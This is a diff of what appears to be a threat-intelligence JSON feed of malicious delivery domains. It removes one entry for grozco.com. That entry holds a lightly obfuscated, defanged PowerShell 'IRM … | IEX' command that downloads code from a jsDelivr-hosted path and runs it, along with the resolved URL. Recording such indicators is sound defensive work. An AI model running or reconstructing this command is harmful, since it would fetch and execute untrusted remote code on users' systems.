@@ -10165,22 +10165,5 @@
     ],
     "ReportId": "cmwa78v3607w70omluib5p702",
     "ScannedAt": "2026-11-10T04:37:57.278000+00:00"
-  },
-  {
-    "UrlDomain": "grozco.com",
-    "DeliveryUrl": [
-      "fastly.jsdelivr.net"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "195.211.47.67"
-    ],
-    "Related": [],
-    "Payload": "IRM fastly[.]jsdelivr[.]net/g\"h\"/wiktor1992kl/sds37465-df459-kcne8xhf-ajdf55/ea25409061fa | IEX",
-    "ResolvedDownloadUrl": [
-      "https://fastly.jsdelivr.net/gh/wiktor1992kl/sds37465-df459-kcne8xhf-ajdf55/ea25409061fa"
-    ],
-    "ReportId": "cmw9zizln07hd0oml2za1wlqb",
-    "ScannedAt": "2026-11-10T01:01:52.755000+00:00"
   }
 ]
